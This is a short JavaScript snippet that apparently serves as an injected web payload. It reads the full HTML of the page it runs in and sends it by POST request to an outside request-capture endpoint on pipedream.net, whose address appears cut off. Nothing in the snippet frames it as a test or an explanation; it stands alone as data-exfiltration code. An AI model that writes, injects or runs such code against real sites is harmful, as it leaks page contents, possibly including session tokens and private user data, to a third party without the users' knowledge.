var htmlContent = document.documentElement.innerHTML;
var xhr = new XMLHttpRequest();
var endpointUrl = "https://eozi6xw3ogrvjqh.m.pipedream.ne";
xhr.open("POST", endpointUrl);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({ htmlContent: htmlContent }));

